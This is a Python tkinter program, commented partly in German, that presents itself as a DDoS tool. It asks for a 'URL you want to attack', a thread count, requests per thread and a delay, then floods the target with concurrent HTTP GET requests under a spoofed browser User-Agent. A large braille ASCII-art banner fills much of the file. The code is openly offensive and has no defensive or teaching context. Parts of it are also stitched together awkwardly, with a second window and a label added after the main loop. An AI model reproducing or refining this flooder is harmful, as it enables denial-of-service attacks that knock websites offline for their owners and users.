import tkinter as tk
from tkinter import messagebox
import threading
import requests
import time
import concurrent.futures

# --- EXTREM EFFIZIENTER DDoS CODE ---
def single_request(url, thread_id):
    headers = {
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
    }
    
    try:
        response = requests.get(url, headers=headers, timeout=5)
        print(f"Thread {thread_id}: Status {response.status_code}")
        return True
    except requests.exceptions.Timeout:
        print(f"Thread {thread_id}: TIMEOUT")
        return False
    except Exception as e:
        print(f"Thread {thread_id}: FEHLER - {str(e)[:50]}")
        return False

def run_ddos(url, threads, requests_per_thread, delay):
    print(f"Starte Hochleistungs-DDoS mit {threads} Threads")
    print(f"Jeder Thread sendet {requests_per_thread} Anfragen")
    
    with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
        futures = []
        
        for i in range(threads):
            for j in range(requests_per_thread):
                futures.append(executor.submit(single_request, url, f"{i}-{j}"))
                time.sleep(delay)
        
        # Warte auf alle Threads
        for future in concurrent.futures.as_completed(futures):
            try:
                future.result()
            except Exception as e:
                print(f"Thread-Fehler: {e}")
    
    print("DDoS-Angriff abgeschlossen")

# --- GUI FUNKTION ---
def start_process():
    url = entry_url.get()
    
    try:
        threads = int(entry_threads.get())
        requests_per_thread = int(entry_requests.get())
        delay = float(entry_delay.get())
    except ValueError:
        messagebox.showerror("Starting", "Enter Number")
        return
    
    if not url:
        messagebox.showerror("Starting", "Enter URL")
        return
    
    
    threading.Thread(target=run_ddos, args=(url, threads, requests_per_thread, delay), daemon=True).start()
    messagebox.showinfo("Info", "DDoS attack startet. Look at Therminal.")

# --- HAUPTPROGRAMM ---
root = tk.Tk()
root.title("DDos")
root.geometry("700x800")

# Schwarzer Hintergrund
root.configure(bg="black")

# GUI Elemente mit roter Schrift
tk.Label(root, text="URL you want to attack:", bg="black", fg="red").pack(pady=5)
entry_url = tk.Entry(root, width=40, bg="gray20", fg="white", insertbackground="white")
entry_url.pack(pady=5)

tk.Label(root, text="Number Threads (Normal: 50-200):", bg="black", fg="red").pack(pady=5)
entry_threads = tk.Entry(root, bg="gray20", fg="white", insertbackground="white")
entry_threads.insert(0, "100")  
entry_threads.pack(pady=5)

tk.Label(root, text="inquire per Thread:", bg="black", fg="red").pack(pady=5)
entry_requests = tk.Entry(root, bg="gray20", fg="white", insertbackground="white")
entry_requests.insert(0, "10")  
entry_requests.pack(pady=5)

tk.Label(root, text="Delay inquire (0.01-0.1):", bg="black", fg="red").pack(pady=5)
entry_delay = tk.Entry(root, bg="gray20", fg="white", insertbackground="white")
entry_delay.insert(0, "0.05")  
entry_delay.pack(pady=5)

# Start Button mit roter Schrift
tk.Button(root, text="Start DDOS", 
         command=start_process, 
         font=("Arial", 12, "bold"), 
         bg="black", 
         fg="red",
         relief=tk.RAISED,
         bd=2).pack(pady=15)

import tkinter as tk

ascii_art = """⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣀⣀⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣤⣀⣀⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⣴⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⠀⠀⠀⠀⠀⠀⠀⠀⢀⣠⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⣿⣿
⣿⣿⠀⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⢰⣿⣿
⣿⣿⣆⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⡇⠀⠉⠻⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠿⠿⠿⠿⠿⢿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⢸⣿⣿
⣿⣿⡇⠀⠀⠀⠘⣿⣿⣿⠿⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⠀⠀⠀⠈⠉⠛⢿⣿⣿⡿⠀⠀⠀⢸⣿⣿
⣿⣿⡿⠿⠓⠂⠸⣿⠋⠀⢀⣠⣤⣾⣿⣿⣿⣦⣄⠀⠀⠀⠀⠀⠈⠛⠿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠁⠀⠀⠀⠀⢀⣴⣾⣿⣿⣿⣶⣤⡀⠀⠈⣿⡇⠀⠚⠛⢻⣿⣿
⣿⣿⣇⡀⠀⠀⠀⢻⣶⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣤⡀⠀⠀⠀⠀⠀⠀⢹⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀⣠⣶⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣿⡇⣀⣀⣀⣸⣿⣿
⣿⣿⡿⠟⠛⠉⣀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣄⠀⠀⠀⢀⣾⣿⣿⣿⣄⠀⠀⠀⢀⣴⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⡈⠉⠙⢻⣿⣿
⣿⣿⣇⣠⣴⣾⣿⣿⣿⠋⣽⣿⣿⣿⣿⣿⡿⠿⠿⠟⠿⢿⣿⣿⣿⣶⣶⣿⣿⣿⣿⣿⣿⣷⣶⣾⣿⣿⣿⠿⠿⠟⠿⠿⢿⣿⣿⣿⣿⣯⡙⢿⣿⣿⣿⣷⣤⣸⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⡇⢰⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠁⠀⠀⠀⠀⠀⠀⠉⢻⣿⣿⣿⣧⠈⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣧⣼⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢿⣿⣿⣿⢿⣿⣿⣟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿⣰⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⠋⣀⣠⣤⣤⣤⣤⣄⣀⠀⢀⣴⣿⣿⣿⣿⢸⣿⣿⣿⡎⣿⣿⣿⣷⡄⠀⢀⣀⣤⣤⣤⣤⣤⣤⣙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣽⣿⣿⡿⢋⣾⣿⣿⣿⣧⡹⢿⣿⣋⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⢋⣴⣿⣿⣿⣿⣿⣿⣿⣦⡙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⣿⣿⠟⠁⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡏⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⠀⠙⢿⣿⣿⣿⣿⣿⣿
⣿⣿⣿⣿⣿⡟⠁⠀⠀⢸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣧⣽⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣯⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡀⠀⠀⠙⣿⣿⣿⣿⣿
⣿⣿⣿⣿⡟⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠛⠉⠉⠉⠉⠙⢿⣿⣿⣿⣿⣿⠟⠉⠁⠈⠉⠉⠛⠿⢿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠸⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠙⠛⠿⠿⠿⠛⠋⠁⠀⠀⠀⠀⠀⠀⠀⠀⠈⠛⠛⠛⠛⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠙⠛⠿⠿⠿⠛⠉⠀⠀⠀⠀⠀⠀⣿⣿⣿⣿
⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣿⣿⣿⣿
⣿⣿⡿⣿⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣼⣿⠿⣿⣿
⣿⣿⡇⠈⠻⣧⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⡿⠁⠀⣿⣿
⣿⣿⡇⠀⠀⠙⣷⣦⣤⣄⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣀⣀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣀⣀⣤⣴⣿⡟⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡉⠉⠉⠀⠈⠉⠙⠛⠛⠷⠶⠶⠶⠶⠞⠛⠛⠉⠉⠉⠉⠉⢩⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⢻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶⣶⣶⣤⣴⣶⣶⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠁⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠸⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠘⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⢿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⠟⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠟⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⠻⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⡿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⣿⣿⠇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠘⣿⣿⣿⣿⣿⣿⣿⠿⠛⠛⠛⠛⠿⣿⣿⣿⣿⣿⣿⣿⡟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣿⣿
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣰⣶⣶⣶⣶⡆⢠⣴⣾⣷⣶⡄⠀⢀⣴⣾⣿⣶⣄⠀⠀⠀⣠⣶⣾⣷⡆⢰⣶⣶⡆⣴⣶⣶⣶⣶⣆⣶⣶⣶⣶⣶⣶⣶⣶⣆⢀⣶⣶⡶⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⡿⠿⠿⢁⣿⣿⡿⠻⣿⠁⣰⣿⣿⣿⣿⣿⣿⣆⠀⣼⣿⣿⣿⣿⡇⢸⣿⣿⠀⣿⣿⡿⠿⠿⢸⣿⣿⣿⣿⣿⡇⢿⣿⣿⣾⣿⡿⠁⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣿⣿⣧⣤⡄⠘⣿⣿⣷⣤⡀⢠⣿⣿⡟⠀⠈⣿⣿⣿⢸⣿⣿⠏⠀⠀⠁⣾⣿⣿⢀⣿⣿⣷⣶⡆⠀⠀⣿⣿⡏⠀⠀⠘⣿⣿⣿⡿⠁⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⢸⣿⣿⣿⣿⠇⠀⠈⠛⣿⣿⣿⢸⣿⣿⡇⠀⢠⣿⣿⡏⢸⣿⣿⡀⠀⢀⠀⣿⣿⡇⢸⣿⣿⠿⠿⠇⠀⢰⣿⣿⡇⠀⠀⠀⣿⣿⣿⠁⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣸⣿⣿⠀⠀⠀⣼⣷⣴⣿⣿⡿⠘⣿⣿⣿⣿⣿⣿⡟⠀⢸⣿⣿⣿⣿⡿⢸⣿⣿⡇⣼⣿⣿⣤⣤⡄⠀⢸⣿⣿⠁⠀⠀⠀⣿⣿⡏⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⣿⣿⡿⠀⠀⠘⠿⢿⣿⡿⠟⠁⠀⠘⠿⣿⣿⠿⠋⠀⠀⠀⠹⢿⣿⡿⠇⢸⣿⣿⠃⣿⣿⣿⣿⣿⠀⠀⣾⣿⣿⠀⠀⠀⢠⣿⣿⡇⠀⠀⠀⠀⠀⠀⠀"""

root = tk.Tk()
root.title("Make me happy")

label = tk.Label(
    root,
    text=ascii_art,
    fg="red",           # ALLES grün
    bg="black",          # Hintergrund schwarz
    font=("Consolas", 12),  # wichtig: Monospace!
    justify="left"
)

label.pack()
root.mainloop()

tk.Label(
    root,
    text="URL you want to attack:",
    bg="black",
    fg="green",
    font=("Consolas", 24)   # Schrift + Größe
).pack(pady=10)
